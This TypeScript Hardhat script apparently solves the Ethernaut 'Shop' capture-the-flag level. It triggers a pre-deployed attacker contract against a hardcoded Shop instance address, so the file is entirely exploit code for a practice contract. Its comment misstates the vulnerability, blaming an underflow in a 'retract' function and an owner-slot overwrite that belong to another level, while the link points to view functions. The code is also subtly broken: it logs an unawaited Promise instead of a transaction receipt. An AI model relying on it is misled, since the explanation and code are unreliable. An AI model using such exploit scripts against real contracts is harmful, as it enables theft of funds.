import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackShop = async () => {
    // change contract addresses here.
    const _shopAddr /*Shop instance address*/ = "0xF675Be946818f77Ba00aD069C99C97080800656E";
    const attackShopBuyerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";

    // Don't touch below
    // Exploit comes from no check for underflow on retract function and changing storage value for owner
    // You may read more on:
    // https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions
    const ABI = ["function buyFromShop(address _shopAddr)"];
    const contract = await ethers.getContractAt(ABI, attackShopBuyerAddress);
    const tx = await contract.buyFromShop(_shopAddr);
    const txReceipt = tx.wait(1);
    const Output = txReceipt.toString();
    console.log(Output);
};

attackShop()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
